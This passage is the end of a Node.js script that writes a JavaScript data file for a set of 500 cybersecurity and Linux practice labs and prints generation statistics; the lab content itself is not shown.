// ParrotCloud OS - 500 Cybersecurity & Linux Practical Labs Data Repository
// Exactly 500 Unique Hands-On Labs with Objectives, Commands, Exercises & Quizzes
// Auto-generated & Validated: ${new Date().toISOString()}
// ==============================================================================

window.PRACTICE_LABS_CATEGORIES = ${JSON.stringify(CATEGORIES, null, 2)};

window.PRACTICE_LABS_DATA = ${JSON.stringify(allLabs, null, 2)};

if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    PRACTICE_LABS_CATEGORIES: window.PRACTICE_LABS_CATEGORIES,
    PRACTICE_LABS_DATA: window.PRACTICE_LABS_DATA
  };
}
`;

fs.writeFileSync(outputPath, fileHeader, 'utf-8');

console.log(`====================================================================`);
console.log(`  SUCCESSFULLY GENERATED 500 PRACTICAL CYBERSECURITY LABS!`);
console.log(`  Total Labs:        ${allLabs.length}`);
console.log(`  Categories:        ${CATEGORIES.length}`);
console.log(`  Total Questions:   ${allLabs.length * 3} (3 per lab)`);
console.log(`  Output Location:   ${outputPath}`);
console.log(`====================================================================`);
